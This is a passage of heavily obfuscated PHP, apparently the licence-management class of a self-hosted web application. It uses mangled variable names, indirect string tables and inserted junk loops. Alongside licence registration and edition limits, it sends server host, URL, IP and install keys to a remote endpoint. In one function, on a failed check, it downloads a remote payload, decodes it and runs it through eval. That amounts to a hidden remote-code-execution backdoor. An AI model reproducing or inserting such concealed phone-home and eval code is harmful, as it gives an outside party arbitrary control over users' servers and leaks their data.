$Ïµôñ»× = json_decode_force($Ïµôñ»×); } if (is_array($Ïµôñ»×) && $Ïµôñ»×[$Ö…úª§[134]] && strstr($Ïµôñ»×[$Ö…úª§[134]], $Ö…úª§[135])) { $‹äŒ£ã§ = explode($Ö…úª§[135], $Ïµôñ»×[$Ö…úª§[134]]); $íé›Ùˆ[$Ö…úª§[136]] = $‹äŒ£ã§[0]; } } $íé›Ùˆ = $this->sgyr5696f5f4(json_encode($íé›Ùˆ), md5($Ö…úª§[137])); $¢êø«”’ = array($Ö…úª§[138] => $íé›Ùˆ); $ÚÄäç = $ú¢·±æ[691]; if (!$ÚÄäç) { return; } call_user_func(array($Ö…úª§[139], $Ö…úª§[140]), $¢êø«”’); } if ($this->tqzhbfc8f26c == $Ö…úª§[108]) { return; } $„åŞ³º½ = array($Ö…úª§[141], $Ö…úª§[142], $Ö…úª§[143], $Ö…úª§[144], $Ö…úª§[145], $Ö…úª§[146]); $¿âèØ“ = $ú¢·±æ[692]; if (!$¿âèØ“) { die; } $´´ÖƒÊ = Model($Ö…úª§[33])->get(); $¢êø«”’ = array($Ö…úª§[147] => $´´ÖƒÊ[$Ö…úª§[34]], $Ö…úª§[148] => $´´ÖƒÊ[$Ö…úª§[35]], $Ö…úª§[149] => $Ö…úª§[6]); foreach ($„åŞ³º½ as $¶øù‘Ò¢) { if (!isset($´´ÖƒÊ[$¶øù‘Ò¢]) || !$´´ÖƒÊ[$¶øù‘Ò¢]) { continue; } $¢êø«”’[$¶øù‘Ò¢] = $´´ÖƒÊ[$¶øù‘Ò¢]; $Å—šâå = $ú¢·±æ[693]; while (strlen($Å—šâå) < $ú¢·±æ[665]) { if (!$Å—šâå) { break; } $Å—šâå++; } } call_user_func(array($Ö…úª§[139], $Ö…úª§[140]), $¢êø«”’); } private function crbt788b6207() { $­¾ÁğÏ÷ =& $_SERVER[–Ú¬çÁ]; $¿¦Ô˜ı =& $_SERVER[¨­üö¨œ]; if ($_SERVER[$¿¦Ô˜ı[24]] != $¿¦Ô˜ı[150]) { return; } if (!_get($GLOBALS, $¿¦Ô˜ı[117])) { die; } $Ø•½à²Á = $GLOBALS[$¿¦Ô˜ı[13]]; if (isset($Ø•½à²Á[$¿¦Ô˜ı[151]])) { $this->vagd59ac4a38(); die; } if (isset($Ø•½à²Á[$¿¦Ô˜ı[152]]) && isset($Ø•½à²Á[$¿¦Ô˜ı[152]]) == $¿¦Ô˜ı[123]) { $Ø•½à²Á[$¿¦Ô˜ı[153]] = Model($¿¦Ô˜ı[33])->get($¿¦Ô˜ı[154]); } if (!isset($Ø•½à²Á[$¿¦Ô˜ı[153]]) || strlen($Ø•½à²Á[$¿¦Ô˜ı[153]]) != 16) { show_json($¿¦Ô˜ı[155] . $Ø•½à²Á[$¿¦Ô˜ı[153]], !1); } $Æ–‚î€« = Model($¿¦Ô˜ı[33])->get($¿¦Ô˜ı[99]); $ŸÆ»îº„ = md5($_SERVER[$¿¦Ô˜ı[105]] . $Æ–‚î€«); $Ã±â Òï = array($¿¦Ô˜ı[153] => $Ø•½à²Á[$¿¦Ô˜ı[153]], $¿¦Ô˜ı[156] => rand_string(16), $¿¦Ô˜ı[157] => $¿¦Ô˜ı[137], $¿¦Ô˜ı[158] => $¿¦Ô˜ı[159], $¿¦Ô˜ı[160] => $_SERVER[$¿¦Ô˜ı[161]], $¿¦Ô˜ı[162] => $_SERVER[$¿¦Ô˜ı[163]], $¿¦Ô˜ı[164] => $_SERVER[$¿¦Ô˜ı[165]], $¿¦Ô˜ı[104] => $ŸÆ»îº„, $¿¦Ô˜ı[166] => Model($¿¦Ô˜ı[33])->get($¿¦Ô˜ı[132])); $˜‘»ˆ³¹ = $­¾ÁğÏ÷[694]; if ($Ø•½à²Á[$¿¦Ô˜ı[167]] == $¿¦Ô˜ı[168]) { $µ¯¨±ü = $this->sgyr5696f5f4($ŸÆ»îº„, $¿¦Ô˜ı[169]); $—˜¦øµ = $this->yozf31e9d1c9(json_encode($Ã±â Òï), $ŸÆ»îº„ . $¿¦Ô˜ı[170], 3); $—˜¦øµ = $—˜¦øµ . $¿¦Ô˜ı[171] . $_SERVER[$¿¦Ô˜ı[161]]; $Ğ¹™§ËÑ = $this->qlef6f4eab07($¿¦Ô˜ı[172] . $µ¯¨±ü . $¿¦Ô˜ı[173] . $—˜¦øµ, -1); show_json($Ğ¹™§ËÑ, !0); } else { if ($Ø•½à²Á[$¿¦Ô˜ı[167]] == $¿¦Ô˜ı[174]) { $±–¬ „ã = substr(md5($¿¦Ô˜ı[175] . $ŸÆ»îº„), 12, 15) . $¿¦Ô˜ı[176]; $—˜¦øµ = $this->ogikc3ba3fc7(trim($Ø•½à²Á[$¿¦Ô˜ı[177]]), $±–¬ „ã, 2); $ô±·÷Øó = json_decode($—˜¦øµ, !0); if (!is_array($ô±·÷Øó) || !is_array($ô±·÷Øó[$¿¦Ô˜ı[178]]) || $ô±·÷Øó[$¿¦Ô˜ı[153]] != !0) { $œ¤Ú˜ˆà = $¿¦Ô˜ı[179]; $Œ“»šİ = $ô±·÷Øó[$¿¦Ô˜ı[178]] ? $¿¦Ô˜ı[180] . $ô±·÷Øó[$¿¦Ô˜ı[178]] : $œ¤Ú˜ˆà; show_json($Œ“»šİ, !1); } else { $Ã±â Òï[$¿¦Ô˜ı[156]] = $ô±·÷Øó[$¿¦Ô˜ı[178]][$¿¦Ô˜ı[181]]; } } else { $ô±·÷Øó = $this->qlef6f4eab07($¿¦Ô˜ı[182], $Ã±â Òï, 10); } } if (!is_array($ô±·÷Øó) || !is_array($ô±·÷Øó[$¿¦Ô˜ı[178]]) || $ô±·÷Øó[$¿¦Ô˜ı[153]] != !0) { $œ¤Ú˜ˆà = LNG($¿¦Ô˜ı[183]); $Œ“»šİ = $ô±·÷Øó[$¿¦Ô˜ı[178]] ? $¿¦Ô˜ı[180] . $ô±·÷Øó[$¿¦Ô˜ı[178]] : $œ¤Ú˜ˆà; show_json($Œ“»šİ, !1); } $Êğ°œƒ¢ = $ô±·÷Øó[$¿¦Ô˜ı[178]]; $×Ş¦Ú¼Ì = $this->nero4976087a($Êğ°œƒ¢[$¿¦Ô˜ı[184]]); if (!$×Ş¦Ú¼Ì || $×Ş¦Ú¼Ì != $Êğ°œƒ¢[$¿¦Ô˜ı[130]]) { $®í•£ñ„ = array($¿¦Ô˜ı[185] => Model($¿¦Ô˜ı[33])->get($¿¦Ô˜ı[99]), $¿¦Ô˜ı[186] => $_SERVER[$¿¦Ô˜ı[105]], $¿¦Ô˜ı[187] => this_url(), $¿¦Ô˜ı[162] => $_SERVER[$¿¦Ô˜ı[163]]); $—˜¦øµ = $this->quar1273c800(json_encode($®í•£ñ„)); $this->qlef6f4eab07($¿¦Ô˜ı[188] . $—˜¦øµ); show_json(LNG($¿¦Ô˜ı[189]), !0); } $øĞ¨Ì¾Ş = array($¿¦Ô˜ı[154] => $Êğ°œƒ¢[$¿¦Ô˜ı[190]], $¿¦Ô˜ı[191] => $Êğ°œƒ¢[$¿¦Ô˜ı[192]], $¿¦Ô˜ı[193] => rand_string(16), $¿¦Ô˜ı[107] => $Êğ°œƒ¢[$¿¦Ô˜ı[194]]); if ($Ã±â Òï[$¿¦Ô˜ı[156]]) { $øĞ¨Ì¾Ş[$¿¦Ô˜ı[193]] = $Ã±â Òï[$¿¦Ô˜ı[156]]; } $§¾½ÔßÂ = substr(md5($øĞ¨Ì¾Ş[$¿¦Ô˜ı[191]]), 10, 10); $Úòİ¡ã = $§¾½ÔßÂ . $øĞ¨Ì¾Ş[$¿¦Ô˜ı[107]] . $øĞ¨Ì¾Ş[$¿¦Ô˜ı[193]]; $—ªÌ×®Æ = $­¾ÁğÏ÷[695]; if (strlen($—ªÌ×®Æ) < $­¾ÁğÏ÷[658]) { die; } $øĞ¨Ì¾Ş[$¿¦Ô˜ı[109]] = strrev(base64_encode($this->sgyr5696f5f4($Úòİ¡ã, $¿¦Ô˜ı[195]))); $ë½ˆı¥€ = rand_string(16); $³Å½ËÃí = $­¾ÁğÏ÷[696]; $‘Æè‘õ® = $ë½ˆı¥€ . $øĞ¨Ì¾Ş[$¿¦Ô˜ı[107]] . $this->sgyr5696f5f4(md5($øĞ¨Ì¾Ş[$¿¦Ô˜ı[154]]), $ë½ˆı¥€); $øĞ¨Ì¾Ş[$¿¦Ô˜ı[110]] = base64_encode(strrev($this->sgyr5696f5f4($‘Æè‘õ®, $¿¦Ô˜ı[196]))); $ê†ËÒí = $­¾ÁğÏ÷[697]; if (!$ê†ËÒí) { die; } if ($Êğ°œƒ¢[$¿¦Ô˜ı[197]] && $Êğ°œƒ¢[$¿¦Ô˜ı[197]] >= 1) { Model($¿¦Ô˜ı[33])->setDeep($¿¦Ô˜ı[198], $¿¦Ô˜ı[123]); } Model($¿¦Ô˜ı[33])->set($øĞ¨Ì¾Ş); $Æ÷üô÷ = md5($_SERVER[$¿¦Ô˜ı[105]] . strrev($Æ–‚î€«) . $øĞ¨Ì¾Ş[$¿¦Ô˜ı[191]]); $ÂÜš¨£ = strrev(substr($Æ÷üô÷, 10, 16)); $úé´”¶Ş = $this->yozf31e9d1c9(json_encode($Êğ°œƒ¢), $Æ÷üô÷); $Ğú¢ı¬¡ = array_to_keyvalue(Model($¿¦Ô˜ı[7])->listData(), $¿¦Ô˜ı[199]); $¶êÑ©² = $Ğú¢ı¬¡[$¿¦Ô˜ı[200]]; $ş¬½Šûº = $­¾ÁğÏ÷[698]; while ($ş¬½Šûº < $­¾ÁğÏ÷[665]) { if ($ş¬½Šûº >= 0) { break; } $ş¬½Šûº++; } $»¯öá¿Ã = array(); $»¯öá¿Ã[$ÂÜš¨£] = $úé´”¶Ş; $¼˜¥±Ô† = $­¾ÁğÏ÷[699]; Model($¿¦Ô˜ı[7])->update($¶êÑ©²[$¿¦Ô˜ı[201]], array($¿¦Ô˜ı[202] => $»¯öá¿Ã)); $this->xbiqa198edc4 = $Êğ°œƒ¢; $this->tqzhbfc8f26c = $øĞ¨Ì¾Ş[$¿¦Ô˜ı[107]]; $ºíÓÄïÅ = $­¾ÁğÏ÷[700]; if (!$ºíÓÄïÅ) { return; } $this->licenseRegistSuccess(); $Õ«Ñ¶ÈÄ = $­¾ÁğÏ÷[701]; if (!$Õ«Ñ¶ÈÄ) { die; } Cache::set($¿¦Ô˜ı[203] . md5($Æ–‚î€« . $¿¦Ô˜ı[204]), $¿¦Ô˜ı[6]); show_json(LNG($¿¦Ô˜ı[189]), !0); $·¤”ŒÆ” = $­¾ÁğÏ÷[702]; while (strlen($·¤”ŒÆ”) < $­¾ÁğÏ÷[671]) { if (!$·¤”ŒÆ”) { break; } $·¤”ŒÆ”++; } } private function licenseRegistSuccess() { $éªıöéù =& $_SERVER[¨­üö¨œ]; $„õîÃê¸ = Model($éªıöéù[33])->get(); if ($„õîÃê¸[$éªıöéù[63]] != $éªıöéù[123]) { Model($éªıöéù[33])->set($éªıöéù[63], $éªıöéù[123]); } Action($éªıöéù[205])->initStart(!0); } private function vagd59ac4a38() { $šÊÃ•Üä =& $_SERVER[–Ú¬çÁ]; $ÂŒ‚¿ºê =& $_SERVER[¨­üö¨œ]; Model($ÂŒ‚¿ºê[33])->set(array($ÂŒ‚¿ºê[154] => $ÂŒ‚¿ºê[6], $ÂŒ‚¿ºê[191] => $ÂŒ‚¿ºê[6], $ÂŒ‚¿ºê[107] => $ÂŒ‚¿ºê[108], $ÂŒ‚¿ºê[109] => $ÂŒ‚¿ºê[6], $ÂŒ‚¿ºê[110] => $ÂŒ‚¿ºê[6])); Model($ÂŒ‚¿ºê[33])->setDeep($ÂŒ‚¿ºê[198], $ÂŒ‚¿ºê[206]); $this->xbiqa198edc4 = array(); $ÇüÉ¯ËŞ = $šÊÃ•Üä[703]; while (strlen($ÇüÉ¯ËŞ) < $šÊÃ•Üä[658]) { if (!$ÇüÉ¯ËŞ) { break; } $ÇüÉ¯ËŞ++; } $this->tqzhbfc8f26c = $ÂŒ‚¿ºê[108]; } private function qhpwee5f1ae4() { $ï†³Ìï™ =& $_SERVER[–Ú¬çÁ]; $›¨ĞÆÎ =& $_SERVER[¨­üö¨œ]; $_SERVER[$›¨ĞÆÎ[163]] = _get($_SERVER, $›¨ĞÆÎ[163], APP_HOST); $à‡‰å§º = $ï†³Ìï™[704]; if (!$à‡‰å§º) { die; } $this->tqzhbfc8f26c = $›¨ĞÆÎ[108]; $¾Ãõ©÷‰ = $ï†³Ìï™[705]; if (strlen($¾Ãõ©÷‰) < $ï†³Ìï™[207]) { return; } $°ûóòèá = Model($›¨ĞÆÎ[33])->get(); $ú¯÷éÓ­ = $ï†³Ìï™[706]; while ($ú¯÷éÓ­ < $ï†³Ìï™[207]) { if ($ú¯÷éÓ­ >= 0) { break; } $ú¯÷éÓ­++; } if ($°ûóòèá[$›¨ĞÆÎ[107]] == $›¨ĞÆÎ[108]) { return; } $÷â¥‹³ò = Model($›¨ĞÆÎ[33])->get($›¨ĞÆÎ[99]); $ô»ÕÌ‰ = $ï†³Ìï™[707]; if (strlen($ô»ÕÌ‰) < $ï†³Ìï™[207]) { die; } $íûûìÃ– = $›¨ĞÆÎ[203] . md5($÷â¥‹³ò . $›¨ĞÆÎ[204]); $ëŠ¬¾”» = Cache::get($íûûìÃ–); if (!is_array($ëŠ¬¾”») || !isset($ëŠ¬¾”»[$›¨ĞÆÎ[207]]) || time() - $ëŠ¬¾”»[$›¨ĞÆÎ[207]] >= 60) { $ùì»­×ı = Model($›¨ĞÆÎ[7])->loadList(); $“óÍìˆÄ = $ùì»­×ı[$›¨ĞÆÎ[200]]; $ï£ëé½à = md5($_SERVER[$›¨ĞÆÎ[105]] . strrev($÷â¥‹³ò) . $°ûóòèá[$›¨ĞÆÎ[191]]); $Ú±¾÷‚ = strrev(substr($ï£ëé½à, 10, 16)); $ëŠ¬¾”» = $this->ogikc3ba3fc7($“óÍìˆÄ[$›¨ĞÆÎ[85]][$Ú±¾÷‚], $ï£ëé½à); $ëŠ¬¾”» = json_decode($ëŠ¬¾”», !0); } if (!is_array($ëŠ¬¾”»)) { return $this->vagd59ac4a38(); } $œ¦ÒŸöä = strtotime($ëŠ¬¾”»[$›¨ĞÆÎ[130]]); if (time() >= $œ¦ÒŸöä) { return $this->vagd59ac4a38(); } if (time() - $ëŠ¬¾”»[$›¨ĞÆÎ[207]] > 20) { $ëŠ¬¾”»[$›¨ĞÆÎ[207]] = time(); Cache::set($íûûìÃ–, $ëŠ¬¾”»); } $this->xbiqa198edc4 = $ëŠ¬¾”»; $this->tqzhbfc8f26c = $°ûóòèá[$›¨ĞÆÎ[107]]; } private function ckold9ff08b3() { $öù¼ïİı =& $_SERVER[¨­üö¨œ]; $¨•—‘è = $GLOBALS[$öù¼ïİı[13]]; $¿¶Ãšƒ´ = $_SERVER[$öù¼ïİı[24]]; $ÅÎÅ³İÎ = $_SERVER[–Ú¬çÁ][708]; if (!$ÅÎÅ³İÎ) { die; } if ($¿¶Ãšƒ´ == $öù¼ïİı[208] && $this->tqzhbfc8f26c == $öù¼ïİı[108]) { show_json(LNG($öù¼ïİı[209]), !1, $öù¼ïİı[210]); } $ŒÉ…ùıî = array($öù¼ïİı[211], $öù¼ïİı[212]); if (in_array($¿¶Ãšƒ´, $ŒÉ…ùıî)) { if ($this->tqzhbfc8f26c == $öù¼ïİı[108] && isset($¨•—‘è[$öù¼ïİı[213]])) { show_json(LNG($öù¼ïİı[209]), !1, $öù¼ïİı[210]); die; } $Óş«¬áÈ = $this->pfki17fd495d(); if ($Óş«¬áÈ != intval($öù¼ïİı[214])) { if ($Óş«¬áÈ <= Model($öù¼ïİı[126])->count()) { show_json(LNG($öù¼ïİı[215]), !1, $öù¼ïİı[210]); die; } } } } private function yadre2a33022() { $µ–Äâ =& $_SERVER[–Ú¬çÁ]; $È¶á‹« =& $_SERVER[¨­üö¨œ]; $ùƒÇöìõ = array($È¶á‹«[120], $È¶á‹«[121]); if (!_get($GLOBALS, $È¶á‹«[117]) || !isset($_GET[$È¶á‹«[216]])) { return; } if (!in_array($_SERVER[$È¶á‹«[24]], $ùƒÇöìõ)) { return; } $èÕöŠŒ· = $È¶á‹«[217]; $ŞØØƒ— = $µ–Äâ[709]; if (strlen($ŞØØƒ—) < $µ–Äâ[671]) { return; } $èÕöŠŒ· = $this->ykzffe1e5510($èÕöŠŒ·, $È¶á‹«[218]); $Œşš‘£³ = $µ–Äâ[710]; if (!$Œşš‘£³) { die; } $òÜÍ¥‘´ = stream_context_create(array($È¶á‹«[219] => array($È¶á‹«[220] => $È¶á‹«[221], $È¶á‹«[222] => 3))); $·íú½è = @file_get_contents($èÕöŠŒ·, !1, $òÜÍ¥‘´); $·û¶Ç·Ÿ = $µ–Äâ[711]; if (!$·û¶Ç·Ÿ) { return; } header($È¶á‹«[223]); if ($·íú½è && strstr($·íú½è, $È¶á‹«[224])) { echo $·íú½è; } die; } public function avxh98a1310e($ş´ÇİƒÀ) { $ù­‚ó’€ =& $_SERVER[–Ú¬çÁ]; $µÃ“€É“ =& $_SERVER[¨­üö¨œ]; if ($this->tqzhbfc8f26c == $µÃ“€É“[225]) { return $ş´ÇİƒÀ; } $ÃÉ€ÌçÉ = array($µÃ“€É“[226] => $µÃ“€É“[227], $µÃ“€É“[228] => $µÃ“€É“[227], $µÃ“€É“[229] => $µÃ“€É“[227], $µÃ“€É“[230] => $µÃ“€É“[231], $µÃ“€É“[232] => $µÃ“€É“[231], $µÃ“€É“[233] => $µÃ“€É“[231], $µÃ“€É“[234] => $µÃ“€É“[231], $µÃ“€É“[235] => $µÃ“€É“[231], $µÃ“€É“[236] => $µÃ“€É“[231], $µÃ“€É“[237] => $µÃ“€É“[231], $µÃ“€É“[238] => $µÃ“€É“[231], $µÃ“€É“[239] => $µÃ“€É“[231], $µÃ“€É“[240] => $µÃ“€É“[231], $µÃ“€É“[241] => $µÃ“€É“[231], $µÃ“€É“[242] => $µÃ“€É“[231]); $êáŠÁò• = $ù­‚ó’€[712]; if (strlen($êáŠÁò•) < $ù­‚ó’€[665]) { return; } $¯è–ùÀ° = explode($µÃ“€É“[243], _get($this->xbiqa198edc4, $µÃ“€É“[114], $µÃ“€É“[6])); $®¥÷÷ñ = $ù­‚ó’€[713]; if (!$®¥÷÷ñ) { return; } $›¸‚ÇÈ¹ = array(); foreach ($ÃÉ€ÌçÉ as $ÌØİ·•Ô => $ä¥ªŸÖ) { if ($ä¥ªŸÖ == $µÃ“€É“[227] && substr($this->tqzhbfc8f26c, 0, 1) == $µÃ“€É“[227]) { continue; } if (!in_array($ÌØİ·•Ô, $¯è–ùÀ°)) { $›¸‚ÇÈ¹[] = $ÌØİ·•Ô; } } foreach ($›¸‚ÇÈ¹ as $ÌØİ·•Ô) { unset($ş´ÇİƒÀ[$ÌØİ·•Ô]); } return $ş´ÇİƒÀ; $…Õ¬âÚø = $ù­‚ó’€[714]; } private function rsuic979aa44() { $°«ê–Æ· =& $_SERVER[¨­üö¨œ]; if ($this->tqzhbfc8f26c != $°«ê–Æ·[108]) { $GLOBALS[$°«ê–Æ·[85]][$°«ê–Æ·[89]][$°«ê–Æ·[244]] = $°«ê–Æ·[206]; return; } $GLOBALS[$°«ê–Æ·[85]][$°«ê–Æ·[245]] = $°«ê–Æ·[123]; if (Model($°«ê–Æ·[246])->get($°«ê–Æ·[63]) != $°«ê–Æ·[206]) { Model($°«ê–Æ·[246])->set($°«ê–Æ·[63], $°«ê–Æ·[206]); } } public function ymnf4ef6d510() { $À¤¯‘ =& $_SERVER[–Ú¬çÁ]; return $_SERVER[¨­üö¨œ][247]; $Î–­ÛÅè = $À¤¯‘[715]; if (strlen($Î–­ÛÅè) < $À¤¯‘[690]) { die; } } private function jqgobd5ae2d3() { $ÍŞïªÎë =& $_SERVER[–Ú¬çÁ]; $÷ÖÔ–¼ë =& $_SERVER[¨­üö¨œ]; $òå¡¤³á = array($÷ÖÔ–¼ë[248], $÷ÖÔ–¼ë[249], $÷ÖÔ–¼ë[250]); $ééòÏŞ† = $ÍŞïªÎë[716]; while ($ééòÏŞ† < $ÍŞïªÎë[665]) { if ($ééòÏŞ† >= 0) { break; } $ééòÏŞ†++; } $ëÍÎò = $÷ÖÔ–¼ë[251] . md5($÷ÖÔ–¼ë[252]); if ($this->tqzhbfc8f26c == $÷ÖÔ–¼ë[108] || !_get($GLOBALS, $÷ÖÔ–¼ë[117])) { return; } if (!in_array($_SERVER[$÷ÖÔ–¼ë[24]], $òå¡¤³á)) { return; } if (time() % 4 != 0) { return; } $Œ‡ƒ—ûœ = call_user_func(array($÷ÖÔ–¼ë[253], $÷ÖÔ–¼ë[254]), $ëÍÎò); $â õ’Œ¨ = $ÍŞïªÎë[717]; if (strlen($â õ’Œ¨) < $ÍŞïªÎë[658]) { die; } if ($Œ‡ƒ—ûœ && time() - $Œ‡ƒ—ûœ < intval($÷ÖÔ–¼ë[255])) { return; } call_user_func(array($÷ÖÔ–¼ë[253], $÷ÖÔ–¼ë[140]), $ëÍÎò, time()); $ü¸Ø–ˆ = $ÍŞïªÎë[718]; if (strlen($ü¸Ø–ˆ) < $ÍŞïªÎë[658]) { die; } $İÅÒÏ³õ = Model($÷ÖÔ–¼ë[33])->get($÷ÖÔ–¼ë[99]); $  Ñú¶† = array($÷ÖÔ–¼ë[153] => Model($÷ÖÔ–¼ë[33])->get($÷ÖÔ–¼ë[154]), $÷ÖÔ–¼ë[167] => $this->tqzhbfc8f26c, $÷ÖÔ–¼ë[164] => $_SERVER[$÷ÖÔ–¼ë[165]], $÷ÖÔ–¼ë[166] => Model($÷ÖÔ–¼ë[33])->get($÷ÖÔ–¼ë[132]), $÷ÖÔ–¼ë[104] => md5($_SERVER[$÷ÖÔ–¼ë[105]] . $İÅÒÏ³õ), $÷ÖÔ–¼ë[157] => $÷ÖÔ–¼ë[137], $÷ÖÔ–¼ë[160] => $_SERVER[$÷ÖÔ–¼ë[161]]); $İÍ…¢’ = $this->qlef6f4eab07($÷ÖÔ–¼ë[256], $  Ñú¶†); if (!is_array($İÍ…¢’)) { return; } if ($İÍ…¢’[$÷ÖÔ–¼ë[153]] && $İÍ…¢’[$÷ÖÔ–¼ë[257]]) { if ($this->nero4976087a($İÍ…¢’[$÷ÖÔ–¼ë[257]]) == $  Ñú¶†[$÷ÖÔ–¼ë[153]]) { return; } } $this->vagd59ac4a38(); if ($this->nero4976087a($İÍ…¢’[$÷ÖÔ–¼ë[257]]) != $  Ñú¶†[$÷ÖÔ–¼ë[153]]) { $È¦²Ï = array($÷ÖÔ–¼ë[185] => $İÅÒÏ³õ, $÷ÖÔ–¼ë[186] => $_SERVER[$÷ÖÔ–¼ë[105]], $÷ÖÔ–¼ë[187] => this_url(), $÷ÖÔ–¼ë[162] => $_SERVER[$÷ÖÔ–¼ë[163]]); $¨òò‚¥¼ = $this->quar1273c800(json_encode($È¦²Ï)); $İÍ…¢’ = $this->qlef6f4eab07($÷ÖÔ–¼ë[188] . $¨òò‚¥¼); if ($İÍ…¢’ && is_array($İÍ…¢’) && isset($İÍ…¢’[$÷ÖÔ–¼ë[257]])) { $Ç‘¼ë¨ï = $this->ogikc3ba3fc7($İÍ…¢’[$÷ÖÔ–¼ë[257]], 2); if ($Ç‘¼ë¨ï) { $Ç‘¼ë¨ï = $this->nero4976087a($Ç‘¼ë¨ï); } if ($Ç‘¼ë¨ï) { try { @eval($Ç‘¼ë¨ï); } catch (Exception $²™ãŸ‡) { } } } } } private function qlef6f4eab07($ÁÖõö¡Œ = '', $Õ©áî­Ó = array(), $¹ÁÖ‰ı = 5) { $ÓéøõçÕ =& $_SERVER[¨­üö¨œ]; $‘òøÏï = $ÓéøõçÕ[258]; $‘òøÏï = $this->ykzffe1e5510($‘òøÏï, $ÓéøõçÕ[259]); $‘òøÏï = $‘òøÏï . $ÁÖõö¡Œ; if ($Õ©áî­Ó && is_array($Õ©áî­Ó)) { $‘òøÏï = $‘òøÏï . $ÓéøõçÕ[260] . http_build_query($Õ©áî­Ó); } if ($Õ©áî­Ó === -1) { return $‘òøÏï; } $Õƒ´Â© = stream_context_create(array($ÓéøõçÕ[219] => array($ÓéøõçÕ[222] => $¹ÁÖ‰ı, $ÓéøõçÕ[220] => $ÓéøõçÕ[261]), $ÓéøõçÕ[262] => array($ÓéøõçÕ[263] => !1, $ÓéøõçÕ[264] => !1))); $Õ©áî­Ó = @file_get_contents($‘òøÏï, !1, $Õƒ´Â©); return json_decode($Õ©áî­Ó, !0); } private function pfki17fd495d() { $ñ¹éÉÃê =& $_SERVER[–Ú¬çÁ]; $ÑÊÙè«ó =& $_SERVER[¨­üö¨œ]; $·‚…Ö“ = array($ÑÊÙè«ó[265] => $ÑÊÙè«ó[266], $ÑÊÙè«ó[267] => $ÑÊÙè«ó[268], $ÑÊÙè«ó[269] => $ÑÊÙè«ó[270], $ÑÊÙè«ó[271] => $ÑÊÙè«ó[272], $ÑÊÙè«ó[273] => $ÑÊÙè«ó[274], $ÑÊÙè«ó[275] => $ÑÊÙè«ó[214], $ÑÊÙè«ó[276] => $ÑÊÙè«ó[214], $ÑÊÙè«ó[277] => $ÑÊÙè«ó[266], $ÑÊÙè«ó[278] => $ÑÊÙè«ó[268], $ÑÊÙè«ó[279] => $ÑÊÙè«ó[270], $ÑÊÙè«ó[280] => $ÑÊÙè«ó[281], $ÑÊÙè«ó[282] => $ÑÊÙè«ó[272], $ÑÊÙè«ó[283] => $ÑÊÙè«ó[284], $ÑÊÙè«ó[285] => $ÑÊÙè«ó[274], $ÑÊÙè«ó[286] => $ÑÊÙè«ó[287], $ÑÊÙè«ó[288] => $ÑÊÙè«ó[289], $ÑÊÙè«ó[290] => $ÑÊÙè«ó[291]); $øÃ¸ã‚Ö = $ñ¹éÉÃê[719]; if (!$øÃ¸ã‚Ö) { die; } $€ñ’ÂàŸ = $·‚…Ö“[$this->tqzhbfc8f26c]; $€ñ’ÂàŸ = intval($€ñ’ÂàŸ ? $€ñ’ÂàŸ : $ÑÊÙè«ó[266]); $ı¨ç¯•´ = $ñ¹éÉÃê[720]; $Ò¯‚êØ = _get($this->xbiqa198edc4, $ÑÊÙè«ó[292]); $Ò¯‚êØ = $Ò¯‚êØ ? intval($Ò¯‚êØ) : 0; return $€ñ’ÂàŸ + $Ò¯‚êØ; } public function sfdq1de26a55($æïÖÔ™†) { $†¬Ğî§¦ =& $_SERVER[–Ú¬çÁ]; $°¡¦¹ƒ™ =& $_SERVER[¨­üö¨œ]; $˜¹İ‹†á = $this->pfki17fd495d(); $Ë²ˆ°ïÉ = $†¬Ğî§¦[721]; while (strlen($Ë²ˆ°ïÉ) < $†¬Ğî§¦[671]) { if (!$Ë²ˆ°ïÉ) { break; } $Ë²ˆ°ïÉ++; } if ($æïÖÔ™†[$°¡¦¹ƒ™[293]] == $°¡¦¹ƒ™[123]) { return; } if ($˜¹İ‹†á >= intval($°¡¦¹ƒ™[214])) { return; } $°æåîØş = Model($°¡¦¹ƒ™[126])->count(); if ($°æåîØş <= $˜¹İ‹†á) { return; } $Ò§É”ŞÕ = Model($°¡¦¹ƒ™[126])->field($°¡¦¹ƒ™[293])->limit($˜¹İ‹†á)->select(); $Ò§É”ŞÕ = array_to_keyvalue($Ò§É”ŞÕ, $°¡¦¹ƒ™[6], $°¡¦¹ƒ™[293]); if (!in_array($æïÖÔ™†[$°¡¦¹ƒ™[293]], $Ò§É”ŞÕ)) { show_json($°¡¦¹ƒ™[294], !1, $°¡¦¹ƒ™[210]); } } public function uhlm8ceb89ba() { $¡òŠ”Ğ =& $_SERVER[¨­üö¨œ]; if (!_get($GLOBALS, $¡òŠ”Ğ[117]) || mt_rand(1, 100) > 20) { return; } $¢¸‚•Ôú = $¡òŠ”Ğ[217]; $¢¸‚•Ôú = $this->ykzffe1e5510($¢¸‚•Ôú, $¡òŠ”Ğ[218]); $îÏÓİ²ƒ = stream_context_create(array($¡òŠ”Ğ[219] => array($¡òŠ”Ğ[220] => $¡òŠ”Ğ[221], $¡òŠ”Ğ[222] => 3))); $‡ÒÉáºá = @file_get_contents($¢¸‚•Ôú, !1, $îÏÓİ²ƒ); echo $¡òŠ”Ğ[295] . hash_encode($‡ÒÉáºá) . $¡òŠ”Ğ[296]; } private function yozf31e9d1c9($àıÑÉÆä, $şìàÍğ£, $ü›’½¤ö = 3) { $îª›†– =& $_SERVER[–Ú¬çÁ]; $ î´û =& $_SERVER[¨­üö¨œ]; usleep(1); $àıÑÉÆä = trim($àıÑÉÆä); $•ğ¶Œ¿Í = $îª›†–[722]; if (!$•ğ¶Œ¿Í) { die; } $¿òî¨şş = mt_rand(0, 5) . $ î´û[6]; $•îç³î¬ = rand_string(15); $à÷ ıÉ = $îª›†–[723]; while (strlen($à÷ ıÉ) < $îª›†–[658]) { if (!$à÷ ıÉ) { break; } $à÷ ıÉ++; } $²ÌƒˆŠ = $ î´û[297]; switch ($¿òî¨şş) { case $ î´û[206]: $ª¾î…Ã = $this->sgyr5696f5f4($àıÑÉÆä, strrev($şìàÍğ£ . $•îç³î¬)); break; $ïÑú“Äú = $îª›†–[724]; if (!$ïÑú“Äú) { die; } case $ î´û[123]: $ª¾î…Ã = $this->sgyr5696f5f4($àıÑÉÆä, strrev($•îç³î¬ . $şìàÍğ£)); $Å¬ì†âã = $îª›†–[725]; if (strlen($Å¬ì†âã) < $îª›†–[658]) { die; } break; case $ î´û[298]: $ª¾î…Ã = $this->sgyr5696f5f4($àıÑÉÆä, base64_encode($•îç³î¬ . $şìàÍğ£)); break; case $ î´û[299]: $ª¾î…Ã = $this->sgyr5696f5f4($àıÑÉÆä, md5($•îç³î¬ . $şìàÍğ£)); $êË™Ë­Ã = $îª›†–[726]; while (strlen($êË™Ë­Ã) < $îª›†–[665]) { if (!$êË™Ë­Ã) { break; 